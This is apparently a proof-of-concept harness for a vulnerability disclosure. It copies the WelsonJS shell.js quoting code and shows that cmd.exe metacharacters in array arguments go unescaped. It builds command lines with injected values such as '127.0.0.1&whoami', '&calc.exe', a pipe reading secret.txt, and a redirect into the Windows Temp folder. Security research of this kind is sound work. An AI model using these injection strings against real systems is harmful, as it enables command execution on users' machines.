// PoC harness: extracted verbatim from WelsonJS lib/shell.js build()/addslashes()
// Purpose: demonstrate that array-form arguments are NOT neutralized against
// cmd.exe metacharacters. Payloads are benign (whoami / calc.exe).

function addslashes(s) {   // verbatim from shell.js / bgloader.js
    return s.toString().replace(/\\/g, '\\\\').
    replace(/\u0008/g, '\\b').
    replace(/\t/g, '\\t').
    replace(/\n/g, '\\n').
    replace(/\f/g, '\\f').
    replace(/\r/g, '\\r').
    replace(/'/g, '\\\'').
    replace(/"/g, '\\"');
}

// verbatim quoting rule from shell.js ShellObject.build()
function build(cmd, prefix) {
    prefix = prefix || null;
    var wrap = function(s){ return prefix != null ? [prefix, s].join(' ') : s; };
    if (typeof cmd === "string") return wrap(cmd);
    if (typeof cmd === "object") {
        return wrap(cmd.map(function(s){
            if (s === '') return "''";
            else if (!/[ "=]/g.test(s)) return s;      // <-- only quotes on space/quote/equals
            else return "\"" + addslashes(s) + "\"";
        }).join(' '));
    }
    return wrap('');
}

// shell.js run() wraps the built string like this:
function run_commandline(cmd){ return "%comspec% /q /c (" + build(cmd) + ")"; }
// shell.js exec() wraps like this:
function exec_commandline(cmd, outpath, errpath){
    return "%comspec% /c (" + build(cmd) + ") 1> " + outpath + " 2> " + errpath;
}

console.log("=== Case A: developer intends ONE argument, attacker controls its value ===");
// e.g. lib/adb.js: SHELL.exec([binPath,"-s", id, "shell"].concat(args))
var attacker_arg = "127.0.0.1&whoami";           // no space, no " , no =  -> NOT quoted
var cmd = ["ping", attacker_arg];
console.log("array passed   :", JSON.stringify(cmd));
console.log("built string   :", build(cmd));
console.log("final run() line:", run_commandline(cmd));
console.log("");

console.log("=== Case B: chained commands via & ===");
var cmd2 = ["adb", "-s", "emulator-5554&calc.exe", "shell", "date"];
console.log("built string   :", build(cmd2));
console.log("final run() line:", run_commandline(cmd2));
console.log("");

console.log("=== Case C: pipe / redirection metachars also survive ===");
console.log(build(["type", "secret.txt|findstr", "pw"]));    // | survives (no space around it)
console.log(build(["echo", "x>C:\\Windows\\Temp\\pwn.txt"])); // > survives
console.log("");

console.log("=== Control: a value WITH a space IS quoted (but & inside still not neutralized) ===");
console.log(build(["ping", "1.2.3.4 &whoami"]));   // becomes "1.2.3.4 &whoami" -> & now inside quotes (cmd still parses & outside? no, quoted) 
